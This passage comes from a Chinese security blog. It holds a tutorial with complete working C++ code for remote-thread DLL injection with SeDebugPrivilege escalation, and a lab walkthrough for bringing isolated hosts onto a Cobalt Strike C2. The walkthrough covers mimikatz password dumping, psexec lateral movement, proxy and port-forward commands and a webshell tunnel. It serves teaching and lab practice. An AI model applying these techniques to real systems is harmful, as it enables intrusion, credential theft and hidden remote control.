title="调整进程权限"></a>调整进程权限</h2><p>当前进程权限级别不够时，用OpenProcess()函数打开如smss.exe，winlogon.exe等系统进程时同样会失败，需要调整当前进程为”SeDebugPrivilege”权限。</p><p>调整权限3个步骤，调整权限使当前进程拥有”SeDebugPrivilege”权限，拥有这个权限后，当前进程可以访问一些受限的系统资源。</p><p>（1）使用OpenProcessToken函数打开当前进程的访问令牌</p><p>（2）使用LookupPrivilegeValue()函数取得描述权限的LUID</p><p>（3）使用AdjustTokenPrivileges()函数调整访问令牌的权限。</p><p>调整权限代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">AdjustProcessTokenPrivilege</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    LUID luidTmp;<br>    HANDLE hToken;<br>    TOKEN_PRIVILEGES tkp;<br><br>    <span class="hljs-keyword">if</span> (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;hToken))<span class="hljs-comment">//使用OpenProcessToken函数打开当前进程的访问令牌</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><br><br>    <span class="hljs-keyword">if</span> (!LookupPrivilegeValue(<span class="hljs-literal">NULL</span>, SE_DEBUG_NAME, &amp;luidTmp))<span class="hljs-comment">//使用LookupPrivilegeValue()函数取得描述权限的LUID</span><br>    &#123;<br>        CloseHandle(hToken);<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br>    tkp.PrivilegeCount = <span class="hljs-number">1</span>;<br>    tkp.Privileges[<span class="hljs-number">0</span>].Luid = luidTmp;<br>    tkp.Privileges[<span class="hljs-number">0</span>].Attributes = SE_PRIVILEGE_ENABLED;<br><br>    <span class="hljs-keyword">if</span> (!AdjustTokenPrivileges(hToken, FALSE, &amp;tkp, <span class="hljs-keyword">sizeof</span>(tkp), <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>))<span class="hljs-comment">//使用AdjustTokenPrivileges()函数调整访问令牌的权限。</span><br>    &#123;<br>        CloseHandle(hToken);<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="相关API函数"><a href="#相关API函数" class="headerlink" title="相关API函数"></a>相关API函数</h2><h3 id="OpenProcess"><a href="#OpenProcess" class="headerlink" title="OpenProcess"></a>OpenProcess</h3><p>有了进程ID后，用此函数获得进程句柄，返回值为进程的句柄，通过此句柄可结束进程</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">HANDLE <span class="hljs-title">OpenProcess</span><span class="hljs-params">(</span></span><br><span class="hljs-function"><span class="hljs-params">  DWORD dwDesiredAccess,<span class="hljs-comment">//进程想要取得的访问权限，PROCESS_ALL_ACCESS</span></span></span><br><span class="hljs-function"><span class="hljs-params">  BOOL  bInheritHandle,<span class="hljs-comment">//获取的句柄是否可继承，一般FALSE</span></span></span><br><span class="hljs-function"><span class="hljs-params">  DWORD dwProcessId<span class="hljs-comment">//要打开的进程ID号</span></span></span><br><span class="hljs-function"><span class="hljs-params">)</span></span>;<br></code></pre></td></tr></table></figure><h3 id="GetProcAddress"><a href="#GetProcAddress" class="headerlink" title="GetProcAddress"></a>GetProcAddress</h3><p>成功返回导出函数或变量的地址,失败返回NULL</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">FARPROC <span class="hljs-title">GetProcAddress</span><span class="hljs-params">(</span></span><br><span class="hljs-function"><span class="hljs-params">  HMODULE hModule,<span class="hljs-comment">//LoadLibrary返回句柄</span></span></span><br><span class="hljs-function"><span class="hljs-params">  LPCSTR  lpProcName<span class="hljs-comment">//指定要获取函数地址的函数</span></span></span><br><span class="hljs-function"><span class="hljs-params">)</span></span>;<br></code></pre></td></tr></table></figure><h3 id="CreateRemoteThread"><a href="#CreateRemoteThread" class="headerlink" title="CreateRemoteThread"></a>CreateRemoteThread</h3><p>功能为创建远程线程，相比CreateThread多了一个hProcess参数，该参数指定要创建线程的进程句柄。CreateThread也是依赖于CreateRemoteThread，两个函数都必须传入线程函数参数（ThreadProc）。这里需要给lpStartAddress函数传入LoadLibraryA的地址替代原来调用的线程函数，LoadLibrary通过GetProcAddress函数从Kernel32.dll中获取。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">HANDLE <span class="hljs-title">CreateRemoteThread</span><span class="hljs-params">(</span></span><br><span class="hljs-function"><span class="hljs-params">  HANDLE                 hProcess,<span class="hljs-comment">//OpenProcess打开的线程句柄</span></span></span><br><span class="hljs-function"><span class="hljs-params">  LPSECURITY_ATTRIBUTES  lpThreadAttributes,</span></span><br><span class="hljs-function"><span class="hljs-params">  SIZE_T                 dwStackSize,</span></span><br><span class="hljs-function"><span class="hljs-params">  LPTHREAD_START_ROUTINE lpStartAddress,<span class="hljs-comment">//线程函数地址，传入LoadLibrary，该函数地址位于Kernel32.dll，每个进程中都固定，GetProcAddress获取</span></span></span><br><span class="hljs-function"><span class="hljs-params">  LPVOID                 lpParameter,<span class="hljs-comment">//传给线程函数参数</span></span></span><br><span class="hljs-function"><span class="hljs-params">  DWORD                  dwCreationFlags,</span></span><br><span class="hljs-function"><span class="hljs-params">  LPDWORD                lpThreadId</span></span><br><span class="hljs-function"><span class="hljs-params">)</span></span>;<br></code></pre></td></tr></table></figure><h3 id="VirtualAllocEx"><a href="#VirtualAllocEx" class="headerlink" title="VirtualAllocEx"></a>VirtualAllocEx</h3><p>在目标进程申请一块内存,返回目标进程申请到的内存块的起始地址</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">LPVOID <span class="hljs-title">VirtualAllocEx</span><span class="hljs-params">(</span></span><br><span class="hljs-function"><span class="hljs-params">  HANDLE hProcess,<span class="hljs-comment">//指定要申请内存的进程句柄</span></span></span><br><span class="hljs-function"><span class="hljs-params">  LPVOID lpAddress,<span class="hljs-comment">//指定申请的起始位置  NULL</span></span></span><br><span class="hljs-function"><span class="hljs-params">  SIZE_T dwSize,<span class="hljs-comment">//指定申请内存的长度    填入申请内存大小，为dll路径的大小</span></span></span><br><span class="hljs-function"><span class="hljs-params">  DWORD  flAllocationType,<span class="hljs-comment">//指定申请内存的状态类型   </span></span></span><br><span class="hljs-function"><span class="hljs-params">  DWORD  flProtect<span class="hljs-comment">//指定申请内存的内存属性</span></span></span><br><span class="hljs-function"><span class="hljs-params">)</span></span>;<br></code></pre></td></tr></table></figure><h3 id="WriteProcessMemory"><a href="#WriteProcessMemory" class="headerlink" title="WriteProcessMemory"></a>WriteProcessMemory</h3><p>把lpBuffer中的内容写到hProcess指定进程中的lpBaseAddress，使用WriteProcessMemory把要注入的DLL文件路径写入目标进程</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">BOOL <span class="hljs-title">WriteProcessMemory</span><span class="hljs-params">(</span></span><br><span class="hljs-function"><span class="hljs-params">  HANDLE  hProcess,<span class="hljs-comment">//指定进程的进程句柄</span></span></span><br><span class="hljs-function"><span class="hljs-params">  LPVOID  lpBaseAddress,<span class="hljs-comment">//指定写入内存的起始地址，先用virtualAllocex在目标进程中申请内存，然后写入dll文件路径</span></span></span><br><span class="hljs-function"><span class="hljs-params">  LPCVOID lpBuffer,<span class="hljs-comment">//指定写入内容的缓冲区</span></span></span><br><span class="hljs-function"><span class="hljs-params">  SIZE_T  nSize,<span class="hljs-comment">//写入内容长度</span></span></span><br><span class="hljs-function"><span class="hljs-params">  SIZE_T  *lpNumberOfBytesWritten<span class="hljs-comment">//接收实际写入内容长度</span></span></span><br><span class="hljs-function"><span class="hljs-params">)</span></span>;<br></code></pre></td></tr></table></figure><h3 id="CloseHandle"><a href="#CloseHandle" class="headerlink" title="CloseHandle"></a>CloseHandle</h3><p>对打开的句柄进行关闭释放资源</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">BOOL <span class="hljs-title">CloseHandle</span><span class="hljs-params">(</span></span><br><span class="hljs-function"><span class="hljs-params">  HANDLE hObject</span></span><br><span class="hljs-function"><span class="hljs-params">)</span></span>;<br></code></pre></td></tr></table></figure><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><p>恶意dll代码，功能为弹出MessageBox</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;pch.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;tchar.h&gt;</span></span><br><br><br><br><span class="hljs-function">BOOL APIENTRY <span class="hljs-title">DllMain</span><span class="hljs-params">( HMODULE hModule,</span></span><br><span class="hljs-function"><span class="hljs-params">                       DWORD  ul_reason_for_call,</span></span><br><span class="hljs-function"><span class="hljs-params">                       LPVOID lpReserved</span></span><br><span class="hljs-function"><span class="hljs-params">                     )</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">switch</span> (ul_reason_for_call)<br>    &#123;<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:<br>        MessageBox(<span class="hljs-literal">NULL</span>, _T(<span class="hljs-string">&quot;Dll Injected&quot;</span>), _T(<span class="hljs-string">&quot;tips&quot;</span>), MB_OK);<br>    <span class="hljs-keyword">case</span> DLL_THREAD_ATTACH:<br>    <span class="hljs-keyword">case</span> DLL_THREAD_DETACH:<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_DETACH:<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><p>注入代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;Tlhelp32.h.&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;tchar.h&gt;</span></span><br><span class="hljs-comment">//提升权限代码</span><br><span class="hljs-function">BOOL <span class="hljs-title">AdjustProcessTokenPrivilege</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    LUID luidTmp;<br>    HANDLE hToken;<br>    TOKEN_PRIVILEGES tkp;<br><br>    <span class="hljs-keyword">if</span> (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;hToken))<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><br><br>    <span class="hljs-keyword">if</span> (!LookupPrivilegeValue(<span class="hljs-literal">NULL</span>, SE_DEBUG_NAME, &amp;luidTmp))<br>    &#123;<br>        CloseHandle(hToken);<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br>    tkp.PrivilegeCount = <span class="hljs-number">1</span>;<br>    tkp.Privileges[<span class="hljs-number">0</span>].Luid = luidTmp;<br>    tkp.Privileges[<span class="hljs-number">0</span>].Attributes = SE_PRIVILEGE_ENABLED;<br><br>    <span class="hljs-keyword">if</span> (!AdjustTokenPrivileges(hToken, FALSE, &amp;tkp, <span class="hljs-keyword">sizeof</span>(tkp), <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>))<br>    &#123;<br>        CloseHandle(hToken);<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br><br><br><br><span class="hljs-function">BOOL <span class="hljs-title">LoadDll</span><span class="hljs-params">(DWORD dwProcessID, <span class="hljs-keyword">char</span>* szDllPathName)</span></span><br><span class="hljs-function"></span>&#123;<br>   <br><br>    <span class="hljs-comment">// #0.提升进程为DEBUG权限</span><br>    <span class="hljs-keyword">if</span> (!AdjustProcessTokenPrivilege())<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;提权失败\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br><br>    <span class="hljs-comment">//获取进程句柄</span><br>    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessID);<br>    <span class="hljs-keyword">if</span> (hProcess == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;OPENPROCESS Error ! \n&quot;</span>);<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br>   <br>    <span class="hljs-comment">//在目标进程分配内存并写入dll路径名</span><br>    LPVOID lpAllocAddr = VirtualAllocEx(hProcess, <span class="hljs-literal">NULL</span>, <span class="hljs-built_in">strlen</span>(szDllPathName) + <span class="hljs-number">1</span>, MEM_COMMIT, PAGE_READWRITE);<br><br>    <span class="hljs-keyword">if</span> (lpAllocAddr == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;VIRTUALALLOCEX Error !  \n&quot;</span>);<br>        GetLastError();<br>        CloseHandle(hProcess);<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br><br>    BOOL bRet = WriteProcessMemory(hProcess, lpAllocAddr, szDllPathName, <span class="hljs-built_in">strlen</span>(szDllPathName) + <span class="hljs-number">1</span>, <span class="hljs-literal">NULL</span>);<br><br>    <span class="hljs-keyword">if</span> (!bRet)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;WriteProcessMemory Error ! \n&quot;</span>);<br>        GetLastError();<br>        CloseHandle(hProcess);<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br>    <br>    <span class="hljs-comment">//获取LoadLibraryA 函数地址</span><br>    FARPROC dwLoadAddr = GetProcAddress(GetModuleHandle(_T(<span class="hljs-string">&quot;kernel32.dll&quot;</span>)), <span class="hljs-string">&quot;LoadLibraryA&quot;</span>);<br>    <span class="hljs-keyword">if</span> (!dwLoadAddr)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;GetProcAddress Error !\n&quot;</span>);<br>        GetLastError();<br>        CloseHandle(hProcess);<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br>    <span class="hljs-comment">//创建远程线程,加载dll</span><br>    HANDLE hThread = CreateRemoteThread(hProcess, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, (LPTHREAD_START_ROUTINE)dwLoadAddr, lpAllocAddr, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-keyword">if</span> (!hThread)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;CreatRemoteTread Error !\n&quot;</span>);<br>        GetLastError();<br>        CloseHandle(hProcess);<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br>    CloseHandle(hProcess);<br><br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    LoadDll(<span class="hljs-number">25028</span>, (<span class="hljs-keyword">char</span>*)<span class="hljs-string">&quot;C:\\Users\\Administrator\\source\\repos\\Project8\\Project8\\DllTest.dll&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>选择PID为25028的进程进行注入</p><p><a href="https://imgbed.cn/preview?id=6018fc43f194b200017364cc"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/3aab9a86-5a38-46cd-8dff-81bf3eb4b27f.png" alt="imgbed.cn图床"></a></p><p>注入成功，弹出MessageBox</p><p><a href="https://imgbed.cn/preview?id=6018fc39bd63390001d215f7"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/fcf08c29-2e1c-4d1f-982d-4fbf3c7e8d27.png" alt="imgbed.cn图床"></a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>不出网主机上线方法</title>
    <link href="/2020/12/15/%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF%E6%96%B9%E6%B3%95/"/>
    <url>/2020/12/15/%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF%E6%96%B9%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<h2 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h2><p>假设192.168.111.0/24为公网ip段，192.168.204.0/24为内网ip段</p><h3 id="web服务器-Windows-2008-r2"><a href="#web服务器-Windows-2008-r2" class="headerlink" title="web服务器 Windows 2008 r2"></a>web服务器 Windows 2008 r2</h3><p>DMZ主机 虚拟机两块网卡一块设置为NAT模式，一块设置为HOSTONLY模式，可通外网 </p><p>公网ip:192.168.111.132</p><p>内网ip:192.168.204.188</p><p><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/d5ebe3b7-283f-40c7-9681-573846cfeb2b.png"></p><h3 id="内网主机-Windows-2012"><a href="#内网主机-Windows-2012" class="headerlink" title="内网主机 Windows 2012"></a>内网主机 Windows 2012</h3><p>虚拟机网卡设置HOSTONLY模式，不通外网</p><p>内网ip:192.168.204.141</p><p><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/59f84afe-29df-4463-ba3c-77a61d7c924e.png"></p><h3 id="C2：-Kali-Linux"><a href="#C2：-Kali-Linux" class="headerlink" title="C2： Kali Linux"></a>C2： Kali Linux</h3><p>公网ip：192.168.111.129</p><h2 id="1-SMB-beacon"><a href="#1-SMB-beacon" class="headerlink" title="1.SMB beacon"></a>1.SMB beacon</h2><p>​    SMB Beacon使用命名管道通过父级Beacon进行通讯，当两个Beacons链接后，子Beacon从父Beacon获取到任务并发送。因为链接的Beacons使用Windows命名管道进行通信，此流量封装在SMB协议中，所以SMB beacon相对隐蔽。SMB beacon不能直接生成可用载荷, 只能使用 PsExec 或 Stageless Payload 上线。</p><p>​    首先得到内网中一台主机的beacon，抓取密码后进行smb喷射，得到另一台开放445端口的机器上的administrator账户密码，在目标机器不出网的情况下，可以使用Smb beacon使目标主机上线</p><p><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/19eb81a2-f005-4078-a051-448004d9796b.png"></p><h4 id="使用条件"><a href="#使用条件" class="headerlink" title="使用条件"></a>使用条件</h4><p> 1.具有 SMB Beacon 的主机必须接受 445 端口上的连接。<br> 2.只能链接由同一个 Cobalt Strike 实例管理的 Beacon。<br> 3.利用这种beacon横移必须有目标主机的管理员权限或者说是拥有具有管理员权限的凭据。</p><h4 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h4><p>web服务器上线cs，run mimikatz抓取密码</p><p><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/cfc1a2fb-2f6c-4213-801c-2560692d1918.png"></p><p>建立listener，选择SMB beacon</p><p><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/f690ca9d-1589-4adc-9a13-67a0f79896a0.png"></p><p>在cs中使用psexec进行横向移动，选择现有的beacon作为跳板，这里凭据必须是administrator ，即拥有目标主机管理员权限</p><p><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/a1bb87d1-7d21-42c2-89c7-45e7c1dc52a5.png"></p><p>连接成功，可以看到smb beacon上线的主机右侧有∞∞标识</p><p><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/70176bc3-c391-4a74-99a0-e46e61488cac.png"></p><h2 id="2-配置listener通过HTTP代理上线"><a href="#2-配置listener通过HTTP代理上线" class="headerlink" title="2.配置listener通过HTTP代理上线"></a>2.配置listener通过HTTP代理上线</h2><h3 id="使用goproxy搭建代理"><a href="#使用goproxy搭建代理" class="headerlink" title="使用goproxy搭建代理"></a>使用goproxy搭建代理</h3><p><a href="https://github.com/snail007/goproxy/releases">goproxy</a></p><p>上传proxy.exe到web服务器，在8080端口开启http代理</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-built_in">shell</span> C:\proxy.exe <span class="hljs-keyword">http</span> -t tcp -p <span class="hljs-string">&quot;0.0.0.0:8080&quot;</span> <span class="hljs-comment">--daemon</span><br></code></pre></td></tr></table></figure><p>用netsh命令把外网ip的8080端口转发到内网ip的192.168.204.188的822端口(必须为未使用的端口，否则会失败),web服务器的80端口被占用，不能使用</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">shell netsh<span class="hljs-built_in"> interface </span>portproxy <span class="hljs-builtin-name">add</span> v4tov4 <span class="hljs-attribute">listenaddress</span>=192.168.204.188 <span class="hljs-attribute">listenport</span>=822 <span class="hljs-attribute">connectaddress</span>=192.168.111.132 <span class="hljs-attribute">connectport</span>=8080<br></code></pre></td></tr></table></figure><p>检测端口是否启用</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">netstat -ano <span class="hljs-string">| findstr :822</span><br></code></pre></td></tr></table></figure><p><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/c3fae3ca-b808-4541-89f6-086887028ae4.png"></p><h3 id="创建listener"><a href="#创建listener" class="headerlink" title="创建listener"></a>创建listener</h3><p>设置如下</p><p><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/362076f2-3cf5-469c-96ef-7b5c2b759f30.png"></p><h3 id="生成stageless-payload"><a href="#生成stageless-payload" class="headerlink" title="生成stageless payload"></a>生成stageless payload</h3><p>关于stage 和 stageless的区别：</p><p><a href="https://www.freebuf.com/articles/system/187312.html">探寻Metasploit Payload模式背后的秘密</a></p><p>stager分阶段，第一阶段申请内存，第二件阶段向C2发起请求并接受shellcode执行</p><p>stageless不分阶段，生成时就包含了所有文件，可以避免shellcode传输不畅造成目标无法上线</p><p><a href="https://imgbed.cn/"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/f2d77176-06a3-438e-9cd0-2a926b8239c2.png"></a></p><p>成功上线</p><p><a href="https://imgbed.cn/"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/43ac908f-2d4f-40db-b2d5-8f3307a1a167.png"></a></p><p>连接过程</p><p><code>192.168.204.141</code>  → <code>192.168.204.188:822</code>→ <code>192.168.111.132:8080</code>→ <code>C2</code></p><h2 id="3-使用pystinger搭建socks4代理"><a href="#3-使用pystinger搭建socks4代理" class="headerlink" title="3.使用pystinger搭建socks4代理"></a>3.使用pystinger搭建socks4代理</h2><p><a href="https://github.com/FunnyWolf/pystinger">pystinger</a></p><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>来源:<a href="https://mp.weixin.qq.com/s/45AKbRS677fxynKW6Qfz7w">红队攻防实践：不出网主机搭建内网隧道新思路</a></p><p>服务端由webshell和stinger_server.exe构成，webshell只负责进行流量转发，大部分建立连接及处理数据的工作由stinger_server.exe实现，本质就是搭建了一个SOCK4代理转发流量</p><p><a href="https://imgbed.cn/"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/53d52a9c-c154-4f08-b84d-f87e8f129ea0.png"></a></p><h4 id="使用方法-1"><a href="#使用方法-1" class="headerlink" title="使用方法"></a>使用方法</h4><p>上传proxy.php到网站目录，正常访问返回<code>UTF-8</code></p><p>上传stinger_server.exe，执行</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">start</span> stinger_server.exe <span class="hljs-number">0.0.0.0</span><br></code></pre></td></tr></table></figure><p>Kali上执行</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">.<span class="hljs-regexp">/stinger_client -w http:/</span><span class="hljs-regexp">/192.168.111.132:81/</span>proxy.php -l <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> -p <span class="hljs-number">60000</span><br></code></pre></td></tr></table></figure><p><a href="https://imgbed.cn/"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/97c6949c-ef85-4518-a49f-78afbb0a1783.png"></a></p><p>cs中新建listener，192.168.204.188为web服务器内网ip，60020为转发端口</p><p><a 